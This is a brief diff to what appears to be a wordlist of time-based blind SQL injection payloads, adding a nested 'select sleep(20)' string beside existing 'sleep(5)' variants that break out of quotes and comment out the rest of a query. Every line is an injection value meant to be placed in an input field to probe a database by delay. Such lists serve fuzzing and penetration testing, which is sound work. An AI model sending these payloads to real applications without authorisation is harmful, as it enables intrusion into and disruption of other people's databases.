@@ -1,4 +1,5 @@
 sleep(5)#
+(select*from(select(sleep(20)))a)
 1 or sleep(5)#
 " or sleep(5)#
 ' or sleep(5)#
